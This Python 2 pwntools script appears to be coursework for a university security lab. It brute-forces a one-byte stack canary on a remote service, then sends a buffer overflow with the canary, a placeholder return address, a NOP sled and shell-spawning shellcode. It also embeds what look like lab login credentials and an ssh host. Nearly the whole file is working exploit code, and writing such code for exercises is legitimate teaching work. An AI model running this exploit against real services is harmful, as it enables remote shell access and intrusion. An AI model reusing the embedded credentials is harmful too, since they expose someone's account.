#!virtualenv/bin/python2

"""Imports"""
from getpass import getpass
from pwn import *

""" Global variables """
#VARIABLE = "test"
ssh_conn = None
STR_PREFIX = 'inetsec028:aezuthah:'
TIMEOUT = 3
MAX_BUF = 4095

TEST = True
GUESS_CANARY = False

def get_tube():
    if(ssh_conn):
        return ssh_conn.connect_remote('10.10.1.2', 2000)
    else:
        return remote('localhost', 2000)

def check_canary(char):
    with get_tube() as r:
        str = STR_PREFIX + 'X' * 400 + char

        r.send(str)

        output = None
        try:
            output = r.recvline(keepends=False, timeout=TIMEOUT)
        except EOFError:
            pass

        if output:
            print(output)

        return not output or not re.match('STACK SMASHING DETECTED', output)

def guess_canary():
    canary = None

    for i in range(0, 255, 1):
    # for i in [ord('x')]:
        print("Testing canary 0x%02x" % i)
        if check_canary(chr(i)):
            canary = i
            break
        # time.sleep(0.01)

    if canary:
        print("canary is 0x%02x" % canary)
    else:
        print("Canary not found (something went wrong)")

    return canary

def exploit(canary):
    with get_tube() as r:

        ret_addr = 0xdeadbeef

        str = STR_PREFIX + 'A' * 400 + chr(canary) + 'A' * 12 + p32(ret_addr) + '\0'

        # Shellcode
        sh = asm(shellcraft.sh())
        nop = asm(shellcraft.nop()) * (MAX_BUF - len(str) - len(sh))

        str += nop + sh

        r.send(str)

def main(argv):
    """ Main entry point for the script """
    global ssh_conn

    context(arch = 'i386', os = 'linux')

    """ Setup the ssh connection """
    if not TEST:
        ssh_conn = ssh(host='secenv.seclab.tuwien.ac.at', user='inetsec028', port=10001)

    # We now know the canary: 0x22
    if GUESS_CANARY:
        canary = guess_canary()
    else:
        if TEST:
            canary = ord('i'); # Test canary
        else:
            canary = 0x22

    exploit(canary)

if __name__ == '__main__':
    sys.exit(main(sys.argv))